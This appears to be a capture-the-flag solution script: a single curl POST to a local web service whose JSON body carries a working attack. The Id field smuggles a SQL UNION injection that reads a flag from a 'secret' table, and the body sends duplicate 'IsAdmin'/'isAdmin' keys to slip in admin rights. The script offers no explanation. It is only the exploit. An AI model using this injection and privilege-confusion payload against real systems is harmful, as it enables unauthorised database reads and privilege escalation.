#!/usr/bin/env bash
curl "http://localhost:8080/note" -XPOST --json '{"Id":"1 UNION SELECT 1,flag,1 from secret ORDER BY 2","IsAdmin":false,"isAdmin":true}'